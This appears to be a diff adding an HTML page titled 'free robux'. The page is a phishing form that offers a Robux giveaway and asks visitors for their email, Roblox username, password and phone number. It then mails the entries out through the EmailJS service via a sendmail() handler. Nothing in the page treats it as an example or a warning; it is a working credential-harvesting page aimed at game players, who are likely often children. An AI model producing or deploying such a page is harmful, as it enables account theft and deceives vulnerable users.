@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+    (function(){
+    emailjs.init("pY32gS7-PJM3Mo7cRYOUR_PUBLIC_KEY");
+    })();
+    </script>
+    <script src="process_form.js"></script>
+
+
+    <title>free robux</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+
+        form {
+            display: grid;
+            grid-gap: 15px;
+        }
+
+        label {
+            font-weight: bold;
+        }
+
+        input,
+        textarea {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-top: 5px;
+        }
+
+        input[type="submit"] {
+            background-color: #4caf50;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Free robux</h1>
+        <form >
+            
+            <label for="email">Email:</label>
+            <input type="text" id="email" name="email" required>
+
+            <label for="name">UserName:</label>
+            <input type="text" id="name" name="subject" required>
+
+            <label for="massege">Password:</label>
+            <input name="message" id="phone" required>
+
+            <label for="subject">Phone Number:</label>
+            <input type="text" id="name" name="subject" required>
+
+            <label >Amount of Robux:</label>
+            <input type="text"  required>
+
+            <input type="submit" onclick="sendmail()" name="send">
+        </form>
+    </div>
+</body>
+</html>
